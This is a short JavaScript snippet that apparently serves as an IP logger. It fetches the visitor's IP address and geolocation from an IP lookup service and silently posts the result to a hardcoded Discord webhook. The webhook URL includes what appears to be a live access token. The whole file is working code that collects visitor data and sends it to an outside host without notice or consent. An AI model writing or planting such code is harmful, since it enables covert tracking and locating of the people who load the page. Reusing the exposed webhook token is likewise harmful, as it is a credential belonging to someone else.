var xhr = new XMLHttpRequest();
xhr.open("GET", "https://ipapi.co/json/");
xhr.responseType = "json";
xhr.onload = function() {
	send_webhook(JSON.stringify(this.response, null, 2));
}
xhr.send();

function send_webhook(result) {
	xhr.open("POST", "https://discord.com/api/webhooks/876966744625922108/a5oIwEqfne2os2enMd9fg0oxrJVjnCMP2kE0-a4r4qDnGSyNoGCA_VEdX5Ef32YNTZ0W")
	xhr.setRequestHeader('Content-type', 'application/json');
	var params = {
		username: "thing",
		embeds:[{"color": 16711680,"title":"title text", "description": result}]
		}
	xhr.send(JSON.stringify(params))
}
